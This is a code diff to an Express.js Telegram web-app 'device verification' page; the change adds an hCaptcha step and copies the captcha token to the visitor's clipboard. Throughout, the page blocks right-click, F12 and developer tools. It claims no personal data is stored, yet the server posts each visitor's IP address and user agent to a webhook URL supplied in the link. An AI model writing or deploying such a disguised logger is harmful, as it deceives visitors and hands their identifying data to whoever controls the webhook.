@@ -1,5 +1,6 @@
 const express = require('express');
 const axios = require('axios');
+const {verify} = require('hcaptcha');
 
 const app = express();
 const PORT = 3000;
@@ -115,7 +116,6 @@ p{
 }
 
 .verify-btn{
-  margin-top:26px;
   width:100%;
   padding:16px;
   border:none;
@@ -161,22 +161,27 @@ p{
     <div>👁 No personal data stored</div>
   </div>
 
-  <button class="verify-btn">Verify Device</button>
+  <div id="captchaWidget" style="
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 20px 0;
+  "></div>
 
-  <div class="status">Waiting for verification…</div>
+  <button class="verify-btn" disabled>Unsolved Captcha</button>
+
+  <div class="status">Please kindly solve the captcha...</div>
 </div>
 
+<script src="https://hcaptcha.com/1/api.js" async defer></script>
 <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
 <script>
   const tg = window.Telegram.WebApp;
   tg.ready();
   tg.expand();
-</script>
-<script>
 document.addEventListener('contextmenu', e => e.preventDefault());
-</script>
-<script>
 document.addEventListener('keydown', e => {
   if (
     e.key === 'F12' ||
@@ -186,8 +191,6 @@ document.addEventListener('keydown', e => {
     e.preventDefault();
   }
 });
-</script>
-<script>
 setInterval(() => {
   if (window.outerWidth - window.innerWidth > 160 ||
       window.outerHeight - window.innerHeight > 160) {
@@ -196,22 +199,37 @@ setInterval(() => {
 }, 1000);
 </script>
 <script>
+let captchaWidget = null;
+const renderCaptcha = () => {
+    captchaWidget = hcaptcha.render('captchaWidget', {
+      sitekey: '994c2296-e6a8-4d28-9b52-df1cb73e48a6',
+      callback: onCaptchaSuccess,
+      size: 'visible'
+    });
+};
+window.onload = () => renderCaptcha();
 const btn = document.querySelector('.verify-btn');
 const status = document.querySelector('.status');
-
+function onCaptchaSuccess(token) {
+  btn.disabled = false;
+  btn.textContent = 'Verify Device';
+  status.textContent = 'Now verify your device to continue...';
+  window.__token = token;
+};
 btn.onclick = async () => {
+  await navigator.clipboard.writeText(window.__token);
   const params = new URLSearchParams(location.search);
   const clientId = params.get('clientId');
   const webhook = params.get('webhook');
   btn.disabled = true;
   btn.textContent = 'Verifying…';
   status.textContent = 'Performing secure verification…';
-
   try {
     await axios.post('/api/verify', {
       clientId,
       webhook,
-      userAgent: navigator.userAgent
+      userAgent: navigator.userAgent,
+      token: window.__token
     });
     btn.textContent = 'Verified ✓';
     status.textContent = 'Device verified successfully.';
@@ -230,7 +248,7 @@ btn.onclick = async () => {
 
 app.post('/api/verify', async (req, res) => {
   const ip = getIP(req);
-  const { clientId, webhook, userAgent } = req.body;
+  const { clientId, webhook, userAgent, token } = req.body;
   if (!clientId) return res.status(400).json({ error: 'Missing client ID!' });
   if (!webhook) return res.status(400).json({ error: 'Missing webhook Url!' });
   if (!userAgent) return res.status(400).json({ error: 'Missing user agent!' });
@@ -240,6 +258,13 @@ app.post('/api/verify', async (req, res) => {
   if (!clientIds.includes(clientId)){
     return res.status(400).json({ error: 'Unregistered client ID!' });
   };
+  if (!token) return res.status(400).json({ error: 'Missing captcha token! Refresh the page and try again.' });
+
+  const isHuman = await verify(process.env.HCAPTCHA_SECRET_KEY, token);
+
+  console.log(isHuman);
+  if (!isHuman || !isHuman.success) return res.status(400).json({ error: 'Invalid captcha! Refresh the page and try again.' });
+  
   try {
     await axios.post(webhook, {
       ip,
